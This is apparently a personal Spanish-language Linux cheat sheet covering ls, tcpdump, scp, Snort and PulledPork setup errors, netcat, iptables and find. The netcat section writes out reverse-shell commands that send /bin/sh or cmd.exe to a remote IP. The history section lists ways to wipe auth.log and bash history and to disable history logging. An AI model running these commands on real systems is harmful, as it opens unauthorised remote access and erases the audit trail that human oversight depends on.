# mercan01
shellhelp
listar archivos

listar con (l)listado largo, (h)formato entendible, (g)sin mostrar grupo, (o)sin mostrar dueño
$ls -lhgo
listar recursivamente incluyendo subdirectorios (R)
$ls -lhgoR
listar omitiendo mayusculas o minusculas (i), y enviando el resultado al fichero listado.txt
$ls -lhgo|grep -i *.txt > /root/listado.txt
	




<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


tcpdump

listar interfaces
$tcpdump -D   
guardar la captura en file.cap
$tcpdump -w file.cap
ver direcciones IP y numeros de puerto en lugar de nombre de dominio y servicio
$tcpdump -n
capturar paquetes donde el destino es 192.168.1.1
$tcpdump -n dst host 192.168.1.1
capturar paquetes cuyo origen es 192.168.1.1
$tcpdump -n src host 192.168.1.1
capturar paquetes cuyo destino u origen sea 192.168.1.1
$tcpdump -n host 192.168.1.1
capturar paquetes cuya red de destino/origen/origen+destino sea 192.168.1.0/24
$tcpdump -n dst net 192.168.1.0/24 | $tcpdump -n src net 192.168.1.0/24 | $tcpdump -n net 192.168.1.0/24
capturar paquetes cuyo puerto de destino sea 23
$tcpdump -n dst port 23
capturar paquetes cuyo rango de puertos de destino este entre 1-1024
$tcpdump -n dst portrange 1-1024
capturar paquetes TCP cuyo rango de puertos de destino este entre 1-1024
$tcpdump -n tcp dst portrange 1-1024
capturar paquetes con destino 192.168.1.1 y puerto 23
$tcpdump -n "dst host 192.168.1.1 and dst port 23"
capturar paquetes con destino 192.168.1.1 y puerto 23 o 80
$tcpdump -n "dst host 192.168.1.1 and (dst port 23 or dst port 80)"
capturar paquetes icmp
$tcpdump -v icmp
capturar paquetes arp
$tcpdump -v arp
capturar paquetes icmp o arp
$tcpdump -v "arp or icmp"
capturar paquetes broadcast o multicast
$tcpdump -n "broadcast or multicast"
capturar 500 bytes de datos por cada paquete en lugar de los 68 bytes por default
$tcpdump -s 500


<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



copiar archivos a traves de SSH:

hacia el remoto
$ scp FILE.txt user@servidor:~/directorio_remoto
desde el remoto
$ scp user@servidor:/home/usuario
copiar desde un servidor a otro:
$ scp user@servidor1:/root/FILE.txt user@servidor2:/root
copia carpeta completa:
$ scp -r /carpeta_local user@servidor:/directorio_remoto


>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

snort:

installation from sources
gzip -d and tar xvf tar.gz

$ ./configure
$ make
$ make install

**********************modos de ejecucion:
sniffer mode
packet logger mode
network intrussion detection system(NIDS)
inline mode
*****************************************

argumentos:  $ snort -v/-vd/-vde ; $ snort -vde -l ./log ; $ snort -b -l ./log ;


directorios utiles: generators (generators ID resume) ; gen-msg.map (Signature/Snort ID) ; 


reglas:

pueden ser creadas manualmente/ bajadas desde snort.org o administradas automaticamente con PulledPork (googlecode o github)

$ tar xvzf pulledpork.tar.gz
$ cd pulledpork
$ cp pulledpor k.pl /usr/local/bin/ && chmod +x /usr/local/bin/pulledpork.pl



________________________________________SNORT posibles errores_________________________________________________________
"instalando en Linux / ParrotSec 4.2.6-parrot-686-pae / Linux parrot 4.2.6-parrot-686-pae #1 SMP Wed Dec 30 12:40:13 EST 2015 i686 GNU/Linux"
  

- ERROR!  dnet header not found, go get it from _____>>>> apt-get install libdnet-dev / apt-get install libdumbnet-dev
- ERROR!  daq_static library not found, go get it from ______>>>> bajar el daq.tar.gz de  snort.org _____>> ./configure & make & make install (Errores en la instalacion de DAQ: LEX y BISON ___>>>> apt-get install flex & bison

- ERROR   al intentar iniciar $ snort
"snort: error while loading shared libraries: libsfbpf.so.0: cannot open shared object file: No such file or directory"
__________>>>> solucion:  $ ldconfig


- ERROR!  pcap DAQ does not support inline _______>>>> usar afpacket ó nfq como DAQ en lugar de pcap
Ex. $ snort -de -i eth0:eth1 --daq-dir /usr/local/lib/daq/daq_afpacket.la -c ../snort.conf 

______________________________________PULLEDPORK posibles errores______________________________________________________

Siguiendo el Step by Step: (https://s3.amazonaws.com/snort-org-site/production/document_files/files/000/000/069/original/Snort-IPS-Tutorial.pdf?AWSAccessKeyId=AKIAIXACIED2SPMSC7GA&Expires=1456431963&Signature=SWPzAjItKty46b%2B0qXkqRGy6Vro%3D)    mega.z -_-

Despues de configurar pulledpork......... 
$ /usr/local/bin/pulledpork.pl -c /usr/local/etc/snort/pulledpork.conf -T -l
"If all goes well, PulledPork consolidated all rules into one file at /etc/snort/rules/snort.rules" ;)



- ERROR   Can't locate Crypt/SSLeay.pm....bla bla bla....BEGIN failed--compilation aborted at /usr/local/bin/  pulledpork.pl line 28.

__________>>>> solucion:  $ perl -MCPAN -e shell
           (perl shell)   $ install Crypt::SSLeay (Ojo! ver Posible ERROR:) solucion: apt-get install libssl-dev       

Posible ERROR:     openssl-version.c:2:30: fatal error: openssl/opensslv.h: No existe el fichero o el directorio
 #include <openssl/opensslv.h>
                              ^
compilation terminated.
Failed to build and link a simple executable using OpenSSL
No 'Makefile' created  NANIS/Crypt-SSLeay-0.72.tar.gz
  /usr/bin/perl Makefile.PL INSTALLDIRS=site -- NOT OK
Failed during this command:
 NANIS/Crypt-SSLeay-0.72.tar.gz               : writemakefile NO -- No 'Makefile' created


Notas utiles: https://github.com/nanis/Crypt-SSLeay
              https://metacpan.org/pod/Crypt::SSLeay#INSTALL
              
_______________________________________________________________________________________________________________________



_______________________________________________________________________________________________________________________


«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

netcat:


$ netcat -lpv 9999 
"escuchando en el puerto 9999"

$ netcat -e /bin/sh 192.9.200.99 9999
"se conecta al listen abierto en el anterior comando abriendo una shell" LINUX

$ netcat -e cmd.exe 192.9.200.99 9999
"se conecta al listen abierto y abre una terminal cmd.exe" WINDOWS


«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

iptables:

chains: INPUT/OUTPUT/FORWARD
rules: ACCEPT/DROP(descarta)/REJECT(rechaza)/POSTROUTING(encaminamiento posterior)
       /PREROUTING(encaminamiento previo)/SNAT/NAT

-A                   "añade una cadena, la opcion -i define una interfaz de trabajo entrante"
-o                   "define una interfaz para trabajo saliente"
-j                   "añade una regla de destino del tráfico, que puede ser ACCEPT, DROP, REJECT
-m                   "define que se aplica la regla si hay una coinncidencia especifica"
--state              "define una lista de distinto estados de las conexiones (INVALID, ESTABLISHED, NEW, RELATED)"
--to-source          "define que IP reportar al trafico externo"
-s                   "define trafico de origen"
-d                   "define trafico de destino"
--source-port        "define el puerto desde el que se origina la conexion"
--destinatio-port    "define el puerto hacia el que se dirige la conexion"
-t                   "tabla a utilizar, pueder ser nat, filter, mangle o raw"

Ejemplos de Reglas:

$ iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT
"Reenvío desde una interfaz de red local (eth1) hacia una interfaz de red publica (eth0)

$ iptables -A FORWARD -i eth0 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT
"Aceptar reenviar los paquetes que son parte de conexiones existentes (ESTABLISHED) o relacionadas de tráfico entrante desde la interfaz eth1 para tráfico saliente por la interfaz eth0:"

$ iptables -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
"Permitir paquetes en el propio muro cortafuegos para tráfico saliente a través de la interfaz eth0 que son parte de conexiones existentes o relacionadas:"

$ iptables -A INPUT -i eth1 -s 0/0 -d 0/0 -j ACCEPT
$ iptables -A INPUT -i lo -s 0/0 -d 0/0 -j ACCEPT
"Permitir (ACCEPT) todo el tráfico entrante (INPUT) desde (-s) cualquier dirección (0/0) la red local (eth1) y desde el retorno del sistema (lo) hacia (-d) cualquier destino (0/0):"

$ iptables -A POSTROUTING -t nat -s 192.168.0.0/24 -o eth0 -j SNAT --to-source x.y.z.c
"Hacer (-j) SNAT para el tráfico saliente (-o) a tráves de la interfaz eth0 proveniente desde (-s) la red local (192.168.0.0/24) utilizando (--to-source) la dirección IP w.x.y.z."

$ iptables -A INPUT -i eth0 -s w.x.y.x/32 -j DROP
$ iptables -A INPUT -i eth0 -s 192.168.0.0/24 -j DROP
$ iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
"Descartar (DROP) todo el tráfico entrante (-i) desde la interfaz eth0 que trate de utilizar la dirección IP pública del servidor (w.x.y.z), alguna dirección IP de la red local (192.168.0.0/24) o la dirección IP del retorno del sistema (127.0.01)"

$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 25 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 80 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 443 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 22 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-p tcp) para los puertos (--destination-port) de los protocolos SMTP (25), HTTP(80), HTTPS (443) y SSH (22):"

$ iptables -A INPUT -p tcp -s 0/0 -d w.x.y.z/32 --destination-port 25 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-tcp) para los puertos (--destination-port) del protocolos SMTP (25) en el servidor (w.x.y.z/32), desde (-s) cualquier lugar (0/0) hacia (-d) cualquier lugar (0/0)."

$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 110 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 995 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 143 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 993 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-p tcp) para los puertos (--destination-port) de los protocolos POP3 (110), POP3S (995), IMAP (143) y IMAPS (993):"

$ iptables -A INPUT -i eth1 -p tcp --sport 68 --dport 67 -j ACCEPT
$ iptables -A INPUT -i eth1 -p udp --sport 68 --dport 67 -j ACCEPT
"Aceptar (ACCEPT) el tráfico entrante (-i) proveniente desde la interfaz eth1 cuando las conexiones se establezcan desde el puerto  (--sport) 67 por protocolos (-p) TCP y UDP."

$ iptables -A INPUT -p udp -s 200.33.146.217/32 --source-port 53 -d 0/0 -j ACCEPT
"Aceptar (ACCEPT) conexiones de tráfico entrante (INPUT) por protocolo (-p) UDP cuando se establezcan desde (-s) el servidor DNS 200.33.145.217 desde el puerto (--source-port) 53 hacia (-d) cualquier destino (0/0):"

$ iptables -A INPUT -p tcp --destination-port 22 -j DROP
$ iptables -A INPUT -p tcp --destination-port 23 -j DROP
"Descartar (DROP) el tráfico entrante (INPUT) para el protocolo (-p) TCP hacia los puerto (--destination-port) de SSH (22) y Telnet (23):"

$ iptables -A INPUT -s a.b.c.d -j DROP
"Descartar (DROP) todo tipo de conexiones de tráfico entrante (INPUT) desde (-s) la dirección IP a.b.c.d:"

$ iptables -A OUTPUT -d a.b.c.d -s 192.168.0.0/24 -j REJECT
"Rechazar (REJECT) conexiones hacia (OUTPUT) la dirección IP a.b.c.d desde la red local:"


$ iptables -L
$ iptables -S TCP
$ iptables -L INPUT
$ iptables -L INPUT -v
$ iptables -Z                    "resetea el conteo de paquetes"
$ iptables -L --line-numbers
$ iptables -D                    "numero de regla" + "chain" Ex. iptables -D 3 INPUT
$ iptables -F "chain"            "flush a single chain"
$ iptables -F                    "flush all chains"


                      FLUSH ALL RULES, DELETE ALL CHAINS AND ACCEPT ALL

"/////////Note: This will effectively disable your firewall. You should only follow this section if you want to start over the configuration of your firewall.////////////////////////"

"First, set the default policies for each of the built-in chains to ACCEPT. The main reason to do this is to ensure that you won't be locked out from your server via SSH:"

$ iptables -P INPUT ACCEPT
$ iptables -P FORWARD ACCEPT
$ iptables -P OUTPUT ACCEPT

"Then flush the nat and mangle tables, flush all chains (-F), and delete all non-default chains (-X):"

$ iptables -t nat -F
$ iptables -t mangle -F
$ iptables -F 
$ iptables -X

"Your firewall will now allow all network traffic. If you list your rules now, you will will see there are none, and only the three default chains (INPUT, FORWARD, and OUTPUT) remain."

«««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


buscar archivos:

$ find /etc/ -name "issue*"
"busca por nombre"

$ find / -perm 777
"busca por permisos"

$ find / -user root
"busca por usuario"

«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


history:

$ history | awk '{print $2}' | awk 'BEGIN {FS="|"}{print $1}'  
"ver comandos mas usados"

$ echo "" /var/log/auth.log
"limpiar auth log"

$ echo "" ~/.bash_history -rf
"limpiar bash history"

$ history -c
"limpiar history sesion reciente"

$ export HISTSIZE=0
"configura en 0 el maximo de history lines"

$ unset HISTFILE
"deshabilitar history- desloguearse despues

$ kill -9 $$
"kill current session"

$ ln /dev/null ~/.bash_history -sf
"envia todos los comandos de history a /dev/null"

$ history | tail -50
"ultimos 50 comandos"


«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

referencias:

-_-     mega.z


